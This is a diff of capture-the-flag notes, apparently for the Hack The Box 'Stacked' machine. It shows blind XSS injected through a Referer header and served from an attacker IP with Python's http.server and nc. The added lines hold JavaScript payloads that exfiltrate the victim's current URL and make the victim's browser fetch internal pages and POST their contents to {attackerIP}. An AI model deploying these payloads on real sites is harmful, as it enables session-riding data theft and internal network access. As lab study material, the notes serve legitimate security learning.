@@ -45,31 +45,53 @@ attacker machine
 - <https://www.horizon3.ai/unauthenticated-xss-to-remote-code-execution-chain-in-mautic-3-2-4/>
 
 #### find out what the URL the victim is looking at.
+- Burpsuite set header Referer: <script src="http://{attackerIP}/pwn.js"></script>
+- ``` python3 -m http.server 80 ``` at pwn.js location, for victime to run pwn.js.
+- use nc to accept the victim`s response.
 
-Method 1:
+xmlhttprequest:
+- like background web request by browser.
+```javascript
+XMLHttpRequest.open(method, url, async)
+// if async = false, the script itself will not go foward, until the response. Otherwise, we will get null.
+XMLHttpRequest.send(body)
+// body: Optional, A body of data to be sent in the XHR request.
+```
+
+Method 1:(lucky there is a referer header)
 ```javascript 
 <script src="http://10.10.14.6/xss.js"></script> 
 ```
 - in the victim`s referer, we can see the response is from: "/read-mail.php?id=5"
 
-Method 2: (better)
+Method 2: (more generic)
 ```javascript
 var exfilreq = new XMLHttpRequest();    
 exfilreq.open("GET", "http://{attackerIP}/" + document.location, false);    
 exfilreq.send(); 
 ```
-- set above script as payload
+- set above script as pwn.js
 - when we nc at 80, can see the victim`s current page appended.
 - in nc, we get "GET /http://mail.stacked.htb/read-mail.php?id=2 HTTP/1.1"
 - For victim visited "http://{attackerIP}/http://mail.stacked.htb/read-mail.php?id=2"
 
-We can even see content the victim is browsing by
+This step we find out the inner email host name. (mail.stacked.htb)
+
+#### Let victim visit inner pages for us.
+
 ```javascript
-var exfilreq = new XMLHttpRequest();    
-exfilreq.open("POST", "http://{attackerIP}:9001/", false);    
-exfilreq.send(document.documentElement.outerHTML); 
+// Make target to visit the target
+var target = "{the address we want victim to visit}"
+var req1 = new XMLHttpRequest();
+req1.open('GET', target, false);
+req1.send()
+var response=req1.responseText;
+// Send what victim saw back to us
+var req2 = new XMLHttpRequest();
+req2.open('POST', "http://{attackerIP}:8000/", false)
+req2.send(response);
 ```
-- then we can open the text in browser, except some CSS or image can not be shown.
+
 
 ## LocalStack vulnerability
 
